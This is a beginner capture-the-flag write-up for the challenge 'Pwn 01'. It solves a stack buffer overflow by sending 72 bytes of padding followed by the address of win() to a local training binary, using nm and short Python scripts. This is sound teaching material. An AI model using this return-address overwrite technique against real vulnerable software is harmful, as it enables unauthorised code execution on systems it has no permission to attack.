# Writeup - Pwn 01 (Buffer Overflow)

You’re about to do a classic beginner exploit. We will overwrite the return address to call `win()`.

## Step 1: Find the `win` Address

```bash
nm -n pwn01 | grep win
```

Example output:
```
0000000000401156 T win
```

## Step 2: Build the Payload
The buffer is 64 bytes, plus 8 bytes saved RBP = **72 bytes** before the return address.

```bash
python3 - <<'PY'
import struct
win_addr = 0x401156  # replace with your address
payload = b"A" * 72 + struct.pack("<Q", win_addr)
print(payload)
PY
```

## Step 3: Run the Program

```bash
python3 - <<'PY'
import struct, subprocess
win_addr = 0x401156  # replace with your address
payload = b"A" * 72 + struct.pack("<Q", win_addr)
subprocess.run(["./pwn01"], input=payload + b"\n")
PY
```

You should see the flag printed.

## Recap
- Find `win()` address
- Send 72 bytes + address
- Get the flag

This is real exploitation technique. Great job.
